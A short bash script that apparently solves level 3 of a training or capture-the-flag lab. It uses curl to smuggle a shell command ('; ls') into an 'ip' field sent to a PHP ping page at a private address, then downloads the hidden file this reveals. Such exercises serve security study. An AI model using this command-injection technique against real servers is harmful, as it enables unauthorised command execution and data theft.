#! /usr/bin/env bash

# It is possible to append the shell command 'ls' after the ping execution.
curl --data "ip=8.8.8.8; ls" http://10.0.23.24:8002/level03/index.php

# After that, the filename is known, so the file can be accessed.
curl http://10.0.23.24:8002/level03/no_w4y_u_will_guess_this_filename.txt